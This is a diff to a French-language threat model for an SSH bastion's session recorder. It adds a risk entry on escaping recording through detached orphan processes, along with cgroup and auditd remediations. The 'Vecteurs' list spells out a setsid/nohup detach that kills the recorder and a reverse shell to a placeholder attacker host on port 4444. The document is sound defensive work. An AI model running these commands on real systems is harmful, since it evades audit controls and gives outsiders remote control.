@@ -1141,6 +1141,48 @@ Voir [R-S18 dans 99-risk-reduce.md](99-risk-reduce.md) pour les pistes d'amélio
 
 ---
 
+### R-S19 - Évasion du containment de session (orphelin détaché)
+
+|                 | Score |
+| --------------- | :---: |
+| **Probabilité** |   3   |
+| **Impact**      |   3   |
+
+**Description :** Un utilisateur connecté SSH peut détacher un processus de l'enregistreur via `setsid`+`nohup` et redirection complète des descripteurs de fichiers (`</dev/null >/dev/null 2>&1`). Une fois détaché, le processus survit à un `kill` du recorder ou à la fin normale de session. Variante : reverse shell où l'attaquant pilote la machine depuis l'extérieur sans rien taper dans le pty enregistré.
+
+**Conditions de la menace :**
+
+1. L'utilisateur a une session SSH ouverte
+2. Le recorder tourne avec le même UID que l'utilisateur (architecturalement nécessaire pour le pty)
+3. `KillUserProcesses=no` (défaut sur de nombreuses distributions)
+
+**Vecteurs :**
+
+- `setsid nohup bash -c '<malicious>' </dev/null >/dev/null 2>&1 &` puis `pkill -KILL -u $UID script`
+- Reverse shell : `setsid nohup bash -c 'bash -i </dev/tcp/attacker/4444 1>&0 2>&0' </dev/null >/dev/null 2>&1 &`
+- Job en arrière-plan détaché qui survit à la déconnexion (sans même tuer le recorder)
+
+**Conséquence :** Actions persistantes ou pilotées depuis l'extérieur sans qu'aucune trace pty ne soit capturée. Le replay de session ne reflète pas l'activité réelle de l'utilisateur sur le bastion.
+
+**Remédiation implémentée — Containment cgroup (PR1 #112, opt-in via `--enable-hardening`) :**
+
+- `KillUserProcesses=yes` dans `/etc/systemd/logind.conf.d/open-bastion.conf` : à la fin de la session SSH, `logind` tue tout le cgroup utilisateur, **y compris les processus détachés via `setsid`** (qui restent dans le même cgroup même si la session POSIX change). `setsid` ne crée pas un nouveau cgroup ; seul `unshare --cgroup` ou des privilèges `CAP_SYS_ADMIN` permettraient l'évasion cgroup, ce qui n'est pas accessible à un utilisateur non privilégié.
+- Pre-flight refusant l'activation du hardening si un utilisateur non-root a `Linger=yes` (cf. R-S20 pour le canal `systemd-run --user --on-active=...`).
+- Limite `nproc` (defense in depth contre fork-bomb pendant la session).
+
+**Remédiation complémentaire — Trace primaire auditd (PR2 #113, opt-in via `--enable-audit-trace`) :**
+
+- Règles `-S execve -S execveat` dans `/etc/audit/rules.d/open-bastion.rules` : chaque commande lancée par le processus détaché laisse une trace indépendante du recorder pty, attribuée à l'UID de l'utilisateur (champ `uid=` du record auditd).
+
+|                 |                                       Score résiduel (PR1 + PR2 activées)                                       |
+| --------------- | :-------------------------------------------------------------------------------------------------------------: |
+| **Probabilité** |  1 (`KillUserProcesses=yes` ferme le canal d'évasion principal ; auditd ferme la trace de seconde main)         |
+| **Impact**      |              1 (orphelins tués à la déconnexion ; commandes tracées syscall-level par auditd)                   |
+
+> **Score résiduel si PR1 NON activée :** P=3, I=3 (zone jaune). Le hardening doit être documenté comme **fortement recommandé** sur tout déploiement bastion réel. Voir [doc/hardening.md](../hardening.md) pour les détails techniques (documentation technique en anglais).
+
+---
+
 ## 4. Matrice des Risques
 
 ### Avant remédiation
